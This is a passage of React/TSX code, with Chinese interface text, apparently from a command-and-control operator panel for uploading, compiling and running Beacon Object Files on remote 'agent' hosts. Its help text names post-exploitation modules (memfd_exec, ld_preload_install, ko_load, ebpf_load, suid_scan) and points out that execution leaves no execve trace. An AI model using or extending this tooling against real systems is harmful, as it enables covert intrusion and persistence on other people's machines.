        </button>
        <input
          className="bof-base"
          value={base}
          onChange={(e) => setBase(e.target.value)}
          onBlur={saveBase}
          placeholder={serverBase || '/root/cc/run/extenders/linux_agent/bofs/'}
          title="BOF .o 文件在团队服务器上的目录；留空 = 跟随服务端返回的 base"
          style={{ width: 200, fontFamily: 'var(--mono)', fontSize: 12 }}
        />
        {base.trim() && (
          <button type="button" className="ghost" onClick={() => { setBase(''); try { localStorage.removeItem(BASE_KEY) } catch { /* ignore */ } pushToast('ok', '已改为跟随服务端') }} title="清空本地覆盖，改用服务端返回的 base">
            跟随服务端
          </button>
        )}
        <input
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="搜索 BOF…"
          style={{ width: 130 }}
        />
        <input
          ref={fileRef}
          type="file"
          accept=".c,.o"
          style={{ display: 'none' }}
          onChange={(e) => void onPickFile(e)}
        />
        <button type="button" className="ghost" disabled={uploading || !api} onClick={() => fileRef.current?.click()} title="上传 .c（自动编译）或 .o（直接投递）">
          {uploading ? '上传中…' : '上传 BOF'}
        </button>
        <button type="button" className="ghost" disabled={compileAll || !api} onClick={() => void compileEvery()} title="把服务端 src_agent/bofs/*.c 全部重编一遍">
          {compileAll ? '重编中…' : '全部重编'}
        </button>
        <PageTips id="bofs">
          <p>BOF 在 <b>agent 进程内</b>执行（内存加载 .o，无 execve 痕迹）。</p>
          <p>列表<b>由服务端 <code>/api/bofs/list</code> 动态给出</b>——服务端有几个就显示几个，新增或上传的会自动出现。</p>
          <p><code>基路径</code>默认跟随服务端；<code>memfd_exec / ld_preload_install / ko_load / ebpf_load</code> 的路径参数则是<b>目标机</b>上的路径。</p>
          <p>上传 <code>.c</code> 会<b>自动编译</b>：配方与 <code>tools/deploy.sh</code> 的 gcc 命令行逐字同源，所以重编未改动的源码产物字节不变。</p>
          <p><b>执行</b>后自动打开该主机的控制台查看输出；勾选<b>异步</b>适合长任务（ebpf_load / suid_scan 建议异步）。</p>
          <p>卡上的 <b>▸ 用法</b>是各模块 <code>.c</code> 头注释里的实战约束；带 <span className="bof-hot-mark">★</span> 的那条忽略了会静默出错或不可逆。</p>
          <p>控制台等价命令：<code>execute bof &lt;服务器路径&gt; [参数...] [async]</code>。开关标记名随 agent 变（linux 是 <code>async</code>，beacon 是 <code>-a</code>）；写错不会报错，而会被并进前一个参数里。</p>
        </PageTips>
      </div>

      {offline && (
        <div className="banner warn" style={{ marginBottom: 10 }}>
          拿不到服务端 BOF 清单（{listErr || '未知原因'}）。下面是<b>离线兜底列表</b>，每条都假定 <code>.o</code> 已存在且<b>未经核对</b>；
          执行前请先确认服务器上确有该文件。
          <button type="button" className="ghost" style={{ marginLeft: 8 }} onClick={() => void load()}>重试</button>
        </div>
      )}

      {out && (
        <div className={`banner ${out.bad ? 'warn' : ''}`} style={{ marginBottom: 10 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <b>{out.title}</b>
            <span style={{ flex: 1 }} />
            <button type="button" className="ghost" onClick={() => void copyText(out.text).then((ok) => pushToast(ok ? 'ok' : 'err', ok ? '已复制' : '复制失败'))}>复制</button>
            <button type="button" className="ghost" onClick={() => setOut(null)}>关闭</button>
          </div>
          <pre className="mono" style={{ margin: '6px 0 0', maxHeight: 220, overflow: 'auto', fontSize: 11, whiteSpace: 'pre-wrap' }}>{out.text || '(空)'}</pre>
        </div>
      )}

      <div className="bof-wrap">
        {CATS.map((cat) => {
          const list = filtered.filter((b) => b.meta.category === cat.key)
          if (!list.length) return null
          return (
            <div key={cat.key} className="bof-group">
              <div className="bof-cat">{cat.label} <span className="dim" style={{ fontWeight: 400 }}>({list.length})</span></div>
              <div className="bof-grid">
                {list.map((b) => (
                  <div key={b.name} className="bof-card">
                    <div className="bof-card-head">
                      <span className="bof-name">{b.name}</span>
                      <span className="dim mono" style={{ fontSize: 11 }}>{b.file}</span>
                      <span style={{ flex: 1 }} />
                      {!offline && !b.obj && <span className="dim" style={{ fontSize: 11, color: 'var(--warn, #d08770)' }} title="服务端 bofs/ 下没有这个 .o，无法执行">未编译</span>}
                      {!offline && b.obj && !b.src && <span className="dim" style={{ fontSize: 11 }} title="服务端没有对应 .c，只能执行不能重编">无源码</span>}
                      {!offline && b.stale && <span className="dim" style={{ fontSize: 11, color: 'var(--warn, #d08770)' }} title=".c 比 .o 新，产物可能已过期">源码已改</span>}
                      <label className="bof-async" title="异步执行（长任务）：走 COMMAND_EXEC_BOF_ASYNC，不阻塞 agent 的命令循环">
                        <input
                          type="checkbox"
                          checked={!!asyncOn[b.name]}
                          onChange={(e) => setAsyncOn((s) => ({ ...s, [b.name]: e.target.checked }))}
                        />
                        异步 {asyncMark()}
                      </label>
                    </div>
                    {/* 「未登记」是**每张卡自己的状态**（服务端有这个 .o、本地 META 没有条目），
                        不该靠分类名去表达 —— 分类名说的事跟它无关。 */}
                    {!b.known && <span className="bof-unknown" title="服务端有这个 .o，但本地 META 表里没有它的描述/参数表。下面显示的参数框是空的，本页只会把「路径」发出去。">未登记</span>}
                    <div className="bof-desc">{b.meta.desc}</div>
                    {(b.meta.notes || []).length > 0 && (
                      <ul className="bof-notes">
                        {(b.meta.notes || []).map((t, i) => (
                          <li key={i} className={t.startsWith('★') ? 'hot' : undefined}>{t}</li>
                        ))}
                      </ul>
                    )}
                    {!offline && (
                      <div className="bof-meta">
                        <span>.o {fmtSize(b.obj_size)} · {fmtTime(b.obj_mtime)}{b.obj_sha256 ? ` · ${b.obj_sha256.slice(0, 12)}` : ''}</span>
                        {b.src ? <span>.c {fmtSize(b.src_size)} · {fmtTime(b.src_mtime)}</span> : null}
                      </div>
                    )}
                    {(b.meta.params || []).map((p) => p.flag ? (
                      // 开关参数用独立类名：`.bof-param input` 是 flex:1 的暗色文本框，
                      // 套在复选框上会把 13px 的方框拉满整行。
                      <label key={p.key} className="bof-flag" title={`勾上则原样发出 ${p.placeholder}`}>
                        <input
                          type="checkbox"
                          checked={!!paramVals[`${b.name}.${p.key}`]}
                          onChange={(e) => setParamVals((s) => ({ ...s, [`${b.name}.${p.key}`]: e.target.checked ? '1' : '' }))}
                        />
                        {p.label} <code>{p.placeholder}</code>
                      </label>
                    ) : (
                      <div key={p.key} className="bof-param">
                        <label>
                          {p.label}{p.required ? ' *' : ''}
                          {p.multi ? <span className="bof-hint" title="空格分隔，每个值发成一个独立字段">多个</span>
                            : p.nulJoin ? <span className="bof-hint" title="空格分隔，合并成一个字段、值之间用 NUL 连接">NUL 连接</span>
                              : p.kind === 'int' ? <span className="bof-hint" title="按裸 4 字节整数编码（BeaconDataInt），不是字符串">整数</span> : null}
                        </label>
                        <input
                          value={paramVals[`${b.name}.${p.key}`] || ''}
                          onChange={(e) => setParamVals((s) => ({ ...s, [`${b.name}.${p.key}`]: e.target.value }))}
                          placeholder={p.placeholder}
                        />
                      </div>
                    ))}
                    <div className="bof-card-foot">
                      <code className="bof-usage">{buildCmdline(b)}</code>
                      <span style={{ flex: 1 }} />
                      <button type="button" className="ghost" onClick={() => void copyCmd(b)}>复制命令</button>
                      <button
                        type="button"
                        className="ghost"
                        disabled={compiling === b.name || !api || (!b.src && !offline)}
                        onClick={() => void compileOne(b)}
                        title={b.src || offline ? '用服务端源码重编这个 BOF' : '服务端没有 .c，无法重编'}
                      >
                        {compiling === b.name ? '…' : '重编'}
                      </button>
                      <button
                        type="button"
                        className="primary"
                        disabled={busy === b.name || !effectiveAgent}
                        onClick={() => void runBof(b)}
                        title={!effectiveAgent ? '没有在线主机' : `在 ${effectiveAgent} 上执行`}
                      >
                        {busy === b.name ? '…' : '执行'}
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )
        })}
        {filtered.length === 0 && (
          <EmptyState
            icon="⎔"
            title={rows.length ? '无匹配 BOF' : '服务端还没有 BOF'}
            hint={rows.length ? '换个搜索词' : '用上方「上传 BOF」投递一个 .c（会自动编译）或 .o'}
          />
        )}
        {onlineAgents.length === 0 && (
          <div className="banner warn" style={{ marginTop: 12 }}>
            当前没有在线主机——先到「主机」页确认 agent 已上线，再回来执行 BOF。
          </div>
        )}
      </div>
    </div>
  )
}
